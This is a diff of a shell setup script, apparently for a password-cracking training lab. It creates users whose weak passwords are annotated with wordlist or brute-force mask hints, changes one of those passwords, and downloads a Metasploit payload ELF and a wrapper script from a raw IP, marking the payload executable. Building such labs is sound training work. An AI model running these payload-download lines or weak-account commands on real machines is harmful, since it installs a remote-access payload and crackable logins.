@@ -78,7 +78,7 @@ printf "password\npassword\n\n\n\n\n\n\n\n" | adduser joshua # wordlist, simple
 printf "afccdeg8\nafccdeg8\n\n\n\n\n\n\n\n" | adduser alyssa # brute-force, matches ?l?l?l?l?l?l?l?d, easy match
 printf "123mango\n123mango\n\n\n\n\n\n\n\n" | adduser rajj # wordlist, end of rockyou
 printf "morecats\nmorecats\n\n\n\n\n\n\n\n" | adduser jamie # wordlist, end of password.lst
-printf "hello!?\nhello!?\n\n\n\n\n\n\n\n" | adduser maurice # brute-force, matches ?l?l?l?l?l?s?s
+printf "hello??\nhello??\n\n\n\n\n\n\n\n" | adduser maurice # brute-force, matches ?l?l?l?l?l?s?s
 wget "http://64.227.19.44/content/dlj23jjoj233jjajdeqo/msfPayload.elf" -O /root/msfPayload.elf
 chmod +x /root/msfPayload.elf
 wget "http://64.227.19.44/content/dlj23jjoj233jjajdeqo/linuxWrapperMSF.sh" -O /root/linuxWrapperMSF.sh
